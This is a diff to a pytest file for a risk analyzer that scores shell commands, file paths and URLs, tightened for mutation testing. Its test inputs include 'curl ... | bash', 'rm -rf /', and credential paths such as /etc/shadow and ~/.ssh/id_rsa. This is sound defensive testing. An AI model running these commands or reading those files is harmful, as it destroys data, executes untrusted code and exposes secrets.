@@ -119,11 +119,12 @@ class TestFilePathAnalysis:
         ],
     )
     def test_normal_file_paths_are_low_risk(self, analyzer: RiskAnalyzer, path: str):
-        """Normal files have zero risk score"""
+        """Normal files have zero risk score and 'Normal file' reason"""
         result = analyzer.analyze_file_path(path)
 
         assert result.level == "low"
         assert result.score == 0
+        assert result.reason == "Normal file"
 
     def test_shadow_file_is_max_score(self, analyzer: RiskAnalyzer):
         """System shadow file has maximum score of 100"""
@@ -143,13 +144,13 @@ class TestWriteMode:
 
     def test_write_mode_behavior(self, analyzer: RiskAnalyzer):
         """Write mode adds 10 points, caps at 100, no bonus for zero score"""
-        # Test 1: Write mode adds 10 points
+        # Test 1: Write mode adds 10 points and prefixes reason with "WRITE:"
         read_result = analyzer.analyze_file_path("/home/user/.aws/credentials")
         write_result = analyzer.analyze_file_path(
             "/home/user/.aws/credentials", write_mode=True
         )
         assert write_result.score == read_result.score + 10
-        assert "WRITE:" in write_result.reason
+        assert write_result.reason.startswith("WRITE:")
 
         # Test 2: Score caps at 100
         shadow_result = analyzer.analyze_file_path("/etc/shadow", write_mode=True)
@@ -222,11 +223,12 @@ class TestUrlAnalysis:
         ],
     )
     def test_normal_urls_are_low_risk(self, analyzer: RiskAnalyzer, url: str):
-        """Normal URLs have zero risk score"""
+        """Normal URLs have zero risk score and 'Normal URL' reason"""
         result = analyzer.analyze_url(url)
 
         assert result.level == "low"
         assert result.score == 0
+        assert result.reason == "Normal URL"
 
 
 # =====================================================
@@ -287,11 +289,23 @@ class TestEdgeCases:
     def test_highest_score_wins_when_multiple_patterns_match(
         self, analyzer: RiskAnalyzer
     ):
-        """When multiple patterns match, highest score wins"""
+        """When multiple patterns match, highest score wins; first pattern at same score wins"""
         result = analyzer.analyze_file_path("/home/user/.ssh/my.key")
 
         assert result.score == 95  # .ssh/ wins over .key
         assert "SSH" in result.reason
+        # Verify no duplicate MITRE techniques (tests deduplication logic)
+        assert len(result.mitre_techniques) == len(set(result.mitre_techniques))
+        # Verify MITRE techniques are actually collected (not empty with inverted logic)
+        assert len(result.mitre_techniques) > 0
+        assert "T1552" in result.mitre_techniques
+
+        # Test that first pattern wins on equal score: .ssh/ and id_rsa both score 95
+        result2 = analyzer.analyze_file_path("/home/user/.ssh/id_rsa")
+        assert result2.score == 95
+        assert (
+            result2.reason == "SSH directory"
+        )  # First pattern wins, not "SSH private key"
 
 
 # =====================================================
@@ -303,62 +317,83 @@ class TestAnalyzeCommand:
     """Tests for analyze_command function"""
 
     @pytest.mark.parametrize(
-        "command,expected_level,min_score,max_score,reason_contains",
+        "command,expected_level,expected_score,reason_exact",
         [
-            # Empty/whitespace commands
-            ("", RiskLevel.LOW, 0, 0, None),
-            ("   ", RiskLevel.LOW, 0, 0, None),
-            # Safe commands
-            ("ls -la", RiskLevel.LOW, 0, 0, None),
-            # Critical commands
-            ("rm -rf /", RiskLevel.CRITICAL, 80, 100, None),
-            (
-                "curl https://example.com/script.sh | bash",
-                RiskLevel.CRITICAL,
-                80,
-                100,
-                "Remote code execution",
-            ),
-            ("git push --force origin main", RiskLevel.CRITICAL, 80, 100, None),
-            # High risk commands
-            ("sudo rm something", RiskLevel.HIGH, 50, 79, None),
-            ("chmod 777 file.txt", RiskLevel.HIGH, 50, 100, None),
-            ("git reset --hard HEAD~1", RiskLevel.HIGH, 50, 79, None),
+            # Empty/whitespace commands - verify exact reason for mutant 6
+            ("", RiskLevel.LOW, 0, "Empty command"),
+            ("   ", RiskLevel.LOW, 0, "Empty command"),
+            # Safe commands - verify exact reason for mutant 9/10
+            ("ls -la", RiskLevel.LOW, 0, "Normal operation"),
+            # Threshold boundary tests for mutants 29-30, 32-33, 35-36
+            # Score = 80 should be CRITICAL (kills mutants 29, 30)
+            ("chmod -R 777 file.txt", RiskLevel.CRITICAL, 80, None),
+            # Score = 50 should be HIGH (kills mutants 32, 33)
+            ("chmod 666 file.txt", RiskLevel.HIGH, 50, None),
+            # Score = 20 should be MEDIUM (kills mutants 35, 36)
+            ("whoami", RiskLevel.MEDIUM, 20, None),
         ],
     )
     def test_command_risk_levels(
         self,
         command: str,
         expected_level: RiskLevel,
-        min_score: int,
-        max_score: int,
-        reason_contains: str | None,
+        expected_score: int,
+        reason_exact: str | None,
     ):
         """Commands are correctly categorized by risk level"""
         result = analyze_command(command)
 
         assert result.level == expected_level
-        assert min_score <= result.score <= max_score
-        if reason_contains:
-            assert reason_contains in result.reason
+        assert result.score == expected_score
+        if reason_exact:
+            assert result.reason == reason_exact
+
+    def test_critical_boundary_score_80(self):
+        """Score exactly 80 triggers CRITICAL level - kills mutants 29, 30"""
+        # chmod -R 777 has base_score=80
+        result = analyze_command("chmod -R 777 file.txt")
+        assert result.score == 80
+        assert result.level == RiskLevel.CRITICAL
+
+    def test_high_boundary_score_50(self):
+        """Score exactly 50 triggers HIGH level - kills mutants 32, 33"""
+        # chmod 666 has base_score=50
+        result = analyze_command("chmod 666 file.txt")
+        assert result.score == 50
+        assert result.level == RiskLevel.HIGH
+
+    def test_medium_boundary_score_20(self):
+        """Score exactly 20 triggers MEDIUM level - kills mutants 35, 36, 37"""
+        # whoami has base_score=20
+        result = analyze_command("whoami")
+        assert result.score == 20
+        assert result.level == RiskLevel.MEDIUM
 
     def test_sudo_package_manager_reduced_risk(self):
-        """sudo with package manager has reduced risk score"""
+        """sudo with package manager has reduced risk score - kills mutant 18, 24"""
         result = analyze_command("sudo brew install something")
-        assert result.score < 50
+        # Base sudo score (55) + brew modifier (-20) = 35
+        assert result.score == 35
+        assert result.level == RiskLevel.MEDIUM
 
-    @pytest.mark.parametrize(
-        "command,should_reduce",
-        [
-            ("rm -rf /tmp --dry-run", True),  # dry-run reduces
-            ("rm -rf /tmp/mydir", True),  # /tmp is safer
-        ],
-    )
-    def test_safe_patterns_reduce_risk(self, command: str, should_reduce: bool):
-        """Safe patterns like --dry-run and /tmp reduce risk"""
-        result = analyze_command(command)
-        if should_reduce:
-            assert result.score < 80
+    def test_dry_run_safe_pattern_reduces_score(self):
+        """--dry-run reduces risk score - kills mutant 24"""
+        # rm -rf / = 95, --dry-run = -20 => 75
+        result = analyze_command("rm -rf / --dry-run")
+        assert result.score == 75
+        assert result.level == RiskLevel.HIGH
+
+    def test_tmp_safe_pattern_reduces_score(self):
+        """/tmp reduces risk score - kills mutant 24"""
+        # rm -rf = 95, /tmp = -60 => 35
+        result = analyze_command("rm -rf /tmp/mydir")
+        assert result.score == 35
+        assert result.level == RiskLevel.MEDIUM
+
+    def test_default_tool_is_bash(self):
+        """Default tool parameter is 'bash' - kills mutant 1"""
+        result = analyze_command("echo hello")
+        assert result.tool == "bash"
 
     def test_command_metadata_stored(self):
         """Tool and command are stored in result"""
@@ -367,6 +402,61 @@ class TestAnalyzeCommand:
 
         assert result.command == cmd
         assert result.tool == "shell"
+
+    def test_empty_vs_whitespace_command(self):
+        """Empty and whitespace-only both return empty command - kills mutant 4"""
+        empty_result = analyze_command("")
+        whitespace_result = analyze_command("   ")
+        assert empty_result.reason == "Empty command"
+        assert whitespace_result.reason == "Empty command"
+        assert empty_result.score == 0
+        assert whitespace_result.score == 0
+
+    def test_remote_code_execution(self):
+        """Remote code execution with pipe to bash"""
+        result = analyze_command("curl https://example.com/script.sh | bash")
+        assert result.level == RiskLevel.CRITICAL
+        assert result.score >= 80
+        assert "Remote code execution" in result.reason
+
+    def test_git_force_push(self):
+        """Git force push is critical"""
+        result = analyze_command("git push --force origin main")
+        assert result.level == RiskLevel.CRITICAL
+        assert result.score >= 80
+
+    def test_chmod_777(self):
+        """chmod 777 is high risk"""
+        result = analyze_command("chmod 777 file.txt")
+        assert result.level == RiskLevel.HIGH
+        assert result.score >= 50
+
+    def test_git_reset_hard(self):
+        """git reset --hard is high risk"""
+        result = analyze_command("git reset --hard HEAD~1")
+        assert result.level == RiskLevel.HIGH
+        assert result.score >= 50
+
+    def test_mitre_techniques_collected(self):
+        """MITRE techniques are collected from patterns - kills mutant 23"""
+        # rm -rf / should have T1485 (Data Destruction)
+        result = analyze_command("rm -rf /")
+        assert len(result.mitre_techniques) > 0
+        assert "T1485" in result.mitre_techniques
+
+    def test_mitre_techniques_not_duplicated(self):
+        """MITRE techniques are deduplicated - kills mutant 23"""
+        # Multiple rm patterns can match, but T1485 should appear only once
+        result = analyze_command("sudo rm -rf /")
+        mitre_set = set(result.mitre_techniques)
+        assert len(result.mitre_techniques) == len(mitre_set)
+
+    def test_first_pattern_wins_on_equal_score(self):
+        """When multiple patterns match with equal score, first wins - kills mutant 20"""
+        # whoami (score 20, "User discovery") appears before ps aux (score 20, "Process listing")
+        result = analyze_command("whoami && ps aux")
+        assert result.score == 20
+        assert result.reason == "User discovery"  # First pattern wins
 
 
 # =====================================================
@@ -390,6 +480,14 @@ class TestGetLevelEmoji:
         """Risk levels map to correct emojis"""
         assert get_level_emoji(level) == expected_emoji
 
+    def test_unknown_level_returns_empty_string(self):
+        """Unknown level returns empty string, not default placeholder - kills mutant 43"""
+        # Pass an invalid value to test fallback behavior
+        result = get_level_emoji(None)  # type: ignore
+        assert result == ""
+        # Also verify it's exactly empty, not some placeholder
+        assert len(result) == 0
+
 
 class TestFormatAlertShort:
     """Tests for format_alert_short function"""
@@ -401,15 +499,6 @@ class TestFormatAlertShort:
             command="ls -la", tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
         )
         assert format_alert_short(low_alert) == "ls -la"
-
-        # Long command - truncated
-        long_cmd = "a" * 50
-        long_alert = SecurityAlert(
-            command=long_cmd, tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
-        )
-        result = format_alert_short(long_alert, max_length=40)
-        assert len(result) == 43  # 40 chars + "..."
-        assert result.endswith("...")
 
         # High risk - has orange emoji prefix
         high_alert = SecurityAlert(
@@ -434,3 +523,44 @@ class TestFormatAlertShort:
         critical_result = format_alert_short(critical_alert)
         assert critical_result.startswith("\U0001f534")  # Red circle
         assert "rm -rf /" in critical_result
+
+    def test_exact_max_length_not_truncated(self):
+        """Command exactly at max_length is NOT truncated - kills mutant 48"""
+        # Command of exactly 40 chars should NOT be truncated (> not >=)
+        cmd_40 = "a" * 40
+        alert = SecurityAlert(
+            command=cmd_40, tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
+        )
+        result = format_alert_short(alert, max_length=40)
+        assert result == cmd_40  # No truncation for exactly 40 chars
+        assert "..." not in result
+
+    def test_over_max_length_truncated(self):
+        """Command over max_length is truncated - kills mutant 48"""
+        # Command of 41 chars SHOULD be truncated
+        cmd_41 = "a" * 41
+        alert = SecurityAlert(
+            command=cmd_41, tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
+        )
+        result = format_alert_short(alert, max_length=40)
+        assert result == "a" * 40 + "..."
+        assert len(result) == 43  # 40 + "..."
+
+    def test_default_max_length_is_40(self):
+        """Default max_length parameter is 40 - kills mutant 44"""
+        # 40 chars exactly - should NOT truncate
+        cmd_40 = "b" * 40
+        alert_40 = SecurityAlert(
+            command=cmd_40, tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
+        )
+        result_40 = format_alert_short(alert_40)  # Uses default max_length
+        assert result_40 == cmd_40
+        assert "..." not in result_40
+
+        # 41 chars - SHOULD truncate with default max_length=40
+        cmd_41 = "c" * 41
+        alert_41 = SecurityAlert(
+            command=cmd_41, tool="bash", score=0, level=RiskLevel.LOW, reason="Normal"
+        )
+        result_41 = format_alert_short(alert_41)  # Uses default max_length
+        assert result_41 == "c" * 40 + "..."
